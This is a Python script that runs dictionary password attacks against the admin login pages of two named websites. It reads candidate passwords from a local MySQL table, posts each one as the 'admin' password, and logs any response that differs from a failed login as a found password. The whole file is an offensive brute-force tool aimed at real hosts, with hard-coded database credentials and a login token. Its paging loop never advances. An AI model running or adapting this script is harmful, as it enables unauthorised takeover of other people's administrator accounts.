# coding=UTF-8
import requests;
import json;
import pymysql;
import time;

def bmxit446():
    headers = {
        "Origin": "http://bmxit446.cn",
        'X-Requested-With': 'XMLHttpRequest',
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 QQBrowser/3.9.3943.400"
    }
    db = pymysql.connect("127.0.0.1", "root", "Db123456", 'pass');
    cursor = db.cursor()
    path = "pass_bmxit446_{}.txt".format(int(time.time()));
    page = 1;
    limit = 100;
    with open(path, 'w+') as f:
        f.write("bmxit446开始运行\n")
    with open("no_{}".format(path), 'w+') as f:
        f.write("")
    while True:
        sql = "select * from cs_pass limit {},{}".format((page-1)*limit,limit);
        cursor.execute(sql)
        select = cursor.fetchall();
        if(len(select) <= 0):
            with open(path, 'a+') as f:
                f.write("结束运行\n")
            print('结束');
            break;
        for data in select:
            post_data = {'username': "admin", 'password': data[1]};
            res = requests.post('http://bmxit446.cn/admin.php/user/publics/signin.html', data=post_data, headers=headers);
            json_res = (json.loads(res.text));
            if(json_res['code'] != 0 or json_res['data'] != '' or json_res['url'] != ''):
                with open(path, 'a+') as f:
                    f.write("找到数据:{}\n".format(data[1]))
            else:
                with open("no_{}".format(path), 'a+') as f:
                    f.write("{}\n".format(data[1]))

def kunlungr():
    url = "https://a1.cn.w.kunlungr.com/admin/connect.php"
    payload = {'username': "admin", 'password': "123456",
               '__token__': 'fa1cc5dfbc345c41b27fb008ae7d43f2', 'action': 'login'}
    init = requests.post(url, data=payload)
    db = pymysql.connect("127.0.0.1", "root", "Db123456", 'pass');
    cursor = db.cursor()
    page = 1;
    limit = 100;
    path = "pass_kunlungr_{}.txt".format(int(time.time()));
    with open(path, 'w+') as f:
        f.write("kunlungr开始运行\n")
    with open("no_{}".format(path), 'w+') as f:
        f.write("")
    with open("pass_{}".format(path), 'w+') as f:
        f.write("")
    while True:
        sql = "select * from cs_pass limit {},{}".format((page - 1) * limit, limit);
        cursor.execute(sql)
        select = cursor.fetchall();
        if (len(select) <= 0):
            with open(path, 'a+') as f:
                f.write("结束运行\n")
            print('结束');
            break;
        for data in select:
            try:
                url = "https://a1.cn.w.kunlungr.com/admin/connect.php"
                payload = {'username': "admin", 'password': "{}".format(data[1]),
                           '__token__': 'fa1cc5dfbc345c41b27fb008ae7d43f2', 'action': 'login'}
                with open("pass_{}".format(path), 'a+') as f:
                    f.write("{}\n".format(data[1]))
                r = requests.post(url, data=payload);
                if r.content != init.content:
                    with open(path, 'a+') as f:
                        f.write("计算得到结果：{}\n".format(data[1]))
            except BaseException as e:
                with open("no_{}".format(path), 'a+') as f:
                    f.write("错误结果：{}\n".format(e))

if __name__ == '__main__':
    #bmxit446();
    kunlungr();